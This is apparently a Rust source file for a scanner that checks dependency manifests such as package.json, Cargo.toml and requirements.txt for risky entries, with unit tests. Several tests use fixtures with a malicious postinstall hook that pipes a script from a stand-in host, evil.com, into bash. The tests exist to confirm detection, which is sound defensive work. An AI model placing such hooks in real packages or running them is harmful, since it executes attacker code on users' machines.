use crate::engine::scanner::{Scanner, ScannerConfig};
use crate::error::Result;
use crate::rules::Finding;
use std::path::Path;
use walkdir::WalkDir;

const DEPENDENCY_FILES: &[&str] = &[
    "package.json",
    "package-lock.json",
    "Cargo.toml",
    "Cargo.lock",
    "requirements.txt",
    "pyproject.toml",
    "poetry.lock",
    "Pipfile",
    "Pipfile.lock",
    "Gemfile",
    "Gemfile.lock",
    "go.mod",
    "go.sum",
    "pom.xml",
    "build.gradle",
    "composer.json",
    "composer.lock",
];

pub struct DependencyScanner {
    config: ScannerConfig,
}

impl_scanner_builder!(DependencyScanner);
impl_content_scanner!(DependencyScanner);

impl DependencyScanner {
    fn is_dependency_file(path: &Path) -> bool {
        path.file_name()
            .and_then(|name| name.to_str())
            .map(|name| DEPENDENCY_FILES.contains(&name))
            .unwrap_or(false)
    }
}

impl Scanner for DependencyScanner {
    fn scan_file(&self, path: &Path) -> Result<Vec<Finding>> {
        let content = self.config.read_file(path)?;
        let path_str = path.display().to_string();
        Ok(self.config.check_content(&content, &path_str))
    }

    fn scan_directory(&self, dir: &Path) -> Result<Vec<Finding>> {
        let mut findings = Vec::new();

        for entry in WalkDir::new(dir)
            .into_iter()
            .filter_map(|e| e.ok())
            .filter(|e| e.path().is_file())
        {
            let path = entry.path();
            if Self::is_dependency_file(path)
                && let Ok(file_findings) = self.scan_file(path)
            {
                findings.extend(file_findings);
            }
        }

        Ok(findings)
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::engine::scanner::ContentScanner;
    use std::fs;
    use tempfile::TempDir;

    fn create_file(dir: &TempDir, name: &str, content: &str) -> std::path::PathBuf {
        let path = dir.path().join(name);
        fs::write(&path, content).unwrap();
        path
    }

    #[test]
    fn test_scan_clean_package_json() {
        let dir = TempDir::new().unwrap();
        create_file(
            &dir,
            "package.json",
            r#"{
              "name": "clean-package",
              "version": "1.0.0",
              "dependencies": {
                "express": "^4.18.0"
              }
            }"#,
        );

        let scanner = DependencyScanner::new();
        let findings = scanner.scan_path(dir.path()).unwrap();

        assert!(
            findings.is_empty(),
            "Clean package.json should have no findings"
        );
    }

    #[test]
    fn test_detect_dangerous_postinstall() {
        let dir = TempDir::new().unwrap();
        create_file(
            &dir,
            "package.json",
            r#"{
              "name": "malicious-package",
              "scripts": {
                "postinstall": "curl http://evil.com/script.sh | bash"
              }
            }"#,
        );

        let scanner = DependencyScanner::new();
        let findings = scanner.scan_path(dir.path()).unwrap();

        assert!(
            findings
                .iter()
                .any(|f| f.id == "DEP-001" || f.id == "SC-001"),
            "Should detect dangerous postinstall script"
        );
    }

    #[test]
    fn test_detect_git_dependency() {
        let dir = TempDir::new().unwrap();
        create_file(
            &dir,
            "package.json",
            r#"{
              "name": "package-with-git-dep",
              "dependencies": {
                "my-lib": "git://github.com/user/repo"
              }
            }"#,
        );

        let scanner = DependencyScanner::new();
        let findings = scanner.scan_path(dir.path()).unwrap();

        assert!(
            findings.iter().any(|f| f.id == "DEP-002"),
            "Should detect git:// dependency"
        );
    }

    #[test]
    fn test_detect_wildcard_version() {
        let dir = TempDir::new().unwrap();
        create_file(
            &dir,
            "package.json",
            r#"{
              "name": "package-with-wildcard",
              "dependencies": {
                "dangerous-lib": "*"
              }
            }"#,
        );

        let scanner = DependencyScanner::new();
        let findings = scanner.scan_path(dir.path()).unwrap();

        assert!(
            findings.iter().any(|f| f.id == "DEP-003"),
            "Should detect wildcard version"
        );
    }

    #[test]
    fn test_detect_http_dependency() {
        let dir = TempDir::new().unwrap();
        create_file(
            &dir,
            "package.json",
            r#"{
              "name": "package-with-http",
              "dependencies": {
                "insecure-lib": "http://example.com/package.tar.gz"
              }
            }"#,
        );

        let scanner = DependencyScanner::new();
        let findings = scanner.scan_path(dir.path()).unwrap();

        assert!(
            findings
                .iter()
                .any(|f| f.id == "DEP-004" || f.id == "DEP-005"),
            "Should detect HTTP/tarball dependency"
        );
    }

    #[test]
    fn test_scan_cargo_toml() {
        let dir = TempDir::new().unwrap();
        create_file(
            &dir,
            "Cargo.toml",
            r#"
[package]
name = "risky-crate"
version = "0.1.0"

[dependencies]
some-lib = { git = "https://github.com/user/repo" }
"#,
        );

        let scanner = DependencyScanner::new();
        let findings = scanner.scan_path(dir.path()).unwrap();

        assert!(
            findings.iter().any(|f| f.id == "DEP-002"),
            "Should detect git dependency in Cargo.toml"
        );
    }

    #[test]
    fn test_scan_requirements_txt() {
        let dir = TempDir::new().unwrap();
        create_file(
            &dir,
            "requirements.txt",
            "git+https://github.com/user/repo.git\nrequests==2.28.0\n",
        );

        let scanner = DependencyScanner::new();
        let findings = scanner.scan_path(dir.path()).unwrap();

        assert!(
            findings.iter().any(|f| f.id == "DEP-002"),
            "Should detect git+ dependency in requirements.txt"
        );
    }

    #[test]
    fn test_ignore_non_dependency_files() {
        let dir = TempDir::new().unwrap();
        create_file(&dir, "README.md", "curl http://evil.com | bash");
        create_file(&dir, "config.json", r#"{"url": "http://evil.com"}"#);

        let scanner = DependencyScanner::new();
        let findings = scanner.scan_path(dir.path()).unwrap();

        assert!(findings.is_empty(), "Should not scan non-dependency files");
    }

    #[test]
    fn test_scan_nested_dependency_files() {
        let dir = TempDir::new().unwrap();
        let sub_dir = dir.path().join("subproject");
        fs::create_dir(&sub_dir).unwrap();
        fs::write(
            sub_dir.join("package.json"),
            r#"{"dependencies": {"evil": "*"}}"#,
        )
        .unwrap();

        let scanner = DependencyScanner::new();
        let findings = scanner.scan_path(dir.path()).unwrap();

        assert!(
            findings.iter().any(|f| f.id == "DEP-003"),
            "Should scan nested dependency files"
        );
    }

    #[test]
    fn test_scan_single_file() {
        let dir = TempDir::new().unwrap();
        let file_path = create_file(
            &dir,
            "package.json",
            r#"{"dependencies": {"lib": "latest"}}"#,
        );

        let scanner = DependencyScanner::new();
        let findings = scanner.scan_file(&file_path).unwrap();

        assert!(
            findings.iter().any(|f| f.id == "DEP-003"),
            "Should detect 'latest' version"
        );
    }

    #[test]
    fn test_is_dependency_file() {
        assert!(DependencyScanner::is_dependency_file(Path::new(
            "package.json"
        )));
        assert!(DependencyScanner::is_dependency_file(Path::new(
            "Cargo.toml"
        )));
        assert!(DependencyScanner::is_dependency_file(Path::new(
            "requirements.txt"
        )));
        assert!(DependencyScanner::is_dependency_file(Path::new(
            "pyproject.toml"
        )));
        assert!(DependencyScanner::is_dependency_file(Path::new("Gemfile")));
        assert!(DependencyScanner::is_dependency_file(Path::new("go.mod")));
        assert!(DependencyScanner::is_dependency_file(Path::new("pom.xml")));
        assert!(DependencyScanner::is_dependency_file(Path::new(
            "composer.json"
        )));

        assert!(!DependencyScanner::is_dependency_file(Path::new(
            "README.md"
        )));
        assert!(!DependencyScanner::is_dependency_file(Path::new(
            "config.json"
        )));
        assert!(!DependencyScanner::is_dependency_file(Path::new("main.rs")));
    }

    #[test]
    fn test_default_trait() {
        let scanner = DependencyScanner::default();
        let dir = TempDir::new().unwrap();
        let findings = scanner.scan_path(dir.path()).unwrap();
        assert!(findings.is_empty());
    }

    #[test]
    fn test_scan_content_directly() {
        let scanner = DependencyScanner::new();
        let content = r#"{"scripts": {"postinstall": "curl http://evil.com | bash"}}"#;
        let findings = scanner.scan_content(content, "package.json").unwrap();
        assert!(!findings.is_empty());
    }

    #[test]
    fn test_scan_nonexistent_path() {
        let scanner = DependencyScanner::new();
        let result = scanner.scan_path(Path::new("/nonexistent/path"));
        assert!(result.is_err());
    }

    #[test]
    fn test_with_skip_comments() {
        let scanner = DependencyScanner::new().with_skip_comments(true);
        let dir = TempDir::new().unwrap();
        create_file(
            &dir,
            "requirements.txt",
            "# git+https://github.com/user/repo\nrequests==2.28.0",
        );

        let findings = scanner.scan_path(dir.path()).unwrap();
        // The git+ line is a comment, so should be skipped
        assert!(
            !findings.iter().any(|f| f.id == "DEP-002"),
            "Should skip commented lines when skip_comments is true"
        );
    }

    #[test]
    fn test_multiple_dependency_files() {
        let dir = TempDir::new().unwrap();
        create_file(&dir, "package.json", r#"{"dependencies": {"a": "*"}}"#);
        create_file(
            &dir,
            "Cargo.toml",
            r#"[dependencies]\nb = { version = "*" }"#,
        );

        let scanner = DependencyScanner::new();
        let findings = scanner.scan_path(dir.path()).unwrap();

        assert!(findings.len() >= 2, "Should find issues in both files");
    }
}
